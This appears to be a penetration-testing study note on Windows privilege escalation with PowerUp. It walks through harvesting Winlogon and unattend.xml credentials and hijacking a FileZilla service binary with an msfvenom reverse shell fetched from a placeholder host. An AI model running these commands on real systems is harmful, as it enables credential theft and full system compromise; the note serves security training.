
> [!abstract] Windows Privilege Escalation with PowerSploit (PowerUp)
> PowerUp is a module within PowerSploit that checks common Windows privilege escalation vectors. It misconfigurations in services, registry keys, and files.
> **Resource:** [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
> **MITRE ATT&CK Mapping:** [T1068 - Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) | [T1552 - Unsecured Credentials](https://attack.mitre.org/techniques/T1552/)

## Initial Setup

> [!info]+ Importing PowerUp Module
> Always bypass the execution policy before importing the module.
> ```powershell
> # Import and run the audit in one line
> powershell -ep bypass -c ". .\privesc\PowerUp.ps1; Invoke-PrivescAudit"
> ```

---

## Scenario 1: Stored Credentials (Registry & Unattend)

> [!tip]+ Finding Cleartext Passwords
> Sometimes administrators store credentials in the registry (for auto-logon) or in unattended installation files. PowerUp automatically checks these locations.
> 
> **PowerUp Audit:**
> ```powershell
> Invoke-PrivescAudit
> # Look for findings related to registry credentials or unattend files.
> ```
> 
> **Manual Registry Check (Winlogon):**
> ```cmd
> reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
> reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultUsername
> reg query 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' /v DefaultPassword
> ```
> 
> **Unattend Credential Access:**
> Windows unattended installation configuration files (`unattend.xml`) may contain plaintext credentials. They are typically located in `C:\Windows\Panther\unattend.xml`.
> ```cmd
> :: Check the file for credentials
> type C:\Windows\Panther\unattend.xml
> ```

> [!success]+ Exploitation (Using Found Credentials)
> If you find the Administrator password, you can use it to spawn a new shell or deliver a payload.
> ```cmd
> :: Simple local shell as administrator
> runas.exe /user:administrator cmd
> ```
> *Alternatively:* Use `impacket-psexec` or Metasploit `hta_server` to get a Meterpreter session using these credentials.

---

## Scenario 2: Service Binary Hijacking

> [!warning]+ Insecure Service Executable Permissions
> In this scenario, we find a service where the current user has "Full Control" (Write) permissions over the service's executable directory. This allows us to replace the legitimate `.exe` with a malicious reverse shell payload.
> 
> ```mermaid
> flowchart LR
>     A[Enumerate Services] --> B(Find Writable Path: FileZilla)
>     B --> C[Generate Malicious EXE]
>     C --> D[Replace Original EXE]
>     D --> E[Restart Service]
>     E --> F[System Shell!]
> ```

> [!example]+ Enumeration
> Identify services with weak file permissions using PowerUp and manual ACL checks.
> ```powershell
> # Run PowerUp audit
> Invoke-PrivescAudit
> 
> # Manually check ACLs of a suspicious directory (e.g., FileZilla Server)
> get-acl "C:\Program Files (x86)\FileZilla Server" | fl
> ```

> [!danger]+ Payload & Listener Setup
> Generate a reverse shell executable and set up a Metasploit handler. Since services often terminate quickly after starting, we **must** configure the payload to automatically migrate to a stable process (like `lsass.exe` or `explorer.exe`) before the service crashes.
> 
> **1. Generate Malicious Executable:**
> ```bash
> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe -o 'FileZilla Server.exe'
> 
> # Start a local HTTP server to transfer the payload
> python3 -m http.server 8080
> ```
> 
> **2. Setup Metasploit Handler with Auto-Migrate:**
> ```ruby
> msf6> use exploit/multi/handler 
> msf6> set LHOST x.x.x.x
> msf6> set LPORT 4444
> msf6> set payload windows/x64/meterpreter/reverse_tcp
> 
> # View advanced options to find the migrate setting
> msf6> advanced
> 
> # Set the script to run automatically upon connection
> msf6> set InitialAutoRunScript post/windows/manage/migrate
> 
> msf6> exploit -j
> ```

> [!bug]+ Hijacking the Service
> Download the malicious executable and overwrite the legitimate service binary.
> ```powershell
> # Download the malicious payload and replace the original FileZilla executable
> iwr -UseBasicParsing -Uri 'http://x.x.x.x:8080/FileZilla Server.exe' -OutFile 'C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe'
> ```
> 
> **Triggering the Payload:**
> Once the file is replaced, you need the service to start to execute your payload. If you have permissions to restart the service:
> ```powershell
> Restart-Service FileZillaServerService
> ```
> *Note: The service will likely crash immediately (Error 1053), but by then, the Meterpreter payload has already executed and migrated to a stable process.*


